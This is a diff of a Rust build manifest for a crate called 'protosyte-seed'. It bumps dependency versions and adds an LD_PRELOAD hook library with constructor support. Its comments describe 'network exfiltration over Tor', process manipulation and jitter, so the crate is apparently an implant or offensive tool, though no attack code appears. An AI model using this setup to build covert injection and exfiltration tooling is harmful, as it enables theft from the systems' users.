@@ -3,10 +3,18 @@ name = "protosyte-seed"
 version = "0.1.0"
 edition = "2021"
 
+[lib]
+name = "protosyte_seed"
+crate-type = ["cdylib", "rlib"]
+
+# Note: hook_lib.rs is built separately as a standalone shared library for LD_PRELOAD
+# Build command: cargo build --lib --manifest-path Cargo.toml --features hook_lib
+# Or create a separate crate in protosyte-seed-hook/
+
 [dependencies]
 # Protobuf serialization/deserialization (Primary)
-prost = { version = "0.13", features = ["derive"] }
-prost-types = "0.13"
+prost = { version = "0.14", features = ["derive"] }
+prost-types = "0.14"
 
 # Network exfiltration over Tor
 reqwest = { version = "0.12", features = ["rustls-tls", "socks", "multipart"] } # SOCKS5 proxy for Tor
@@ -27,11 +35,12 @@ nix = "0.28" # For syscalls, process manipulation
 sha2 = "0.10" # For HMAC-SHA256
 hmac = "0.12" # For HMAC computation
 hex = "0.4" # For hex encoding
-rand = "0.8" # For jitter calculation
+rand = "0.9" # For jitter calculation
 regex = "1.10" # For pattern matching
+ctor = "0.6.2" # For library constructors
 
 [build-dependencies]
-prost-build = "0.13"
+prost-build = "0.14"
 
 [features]
 default = []
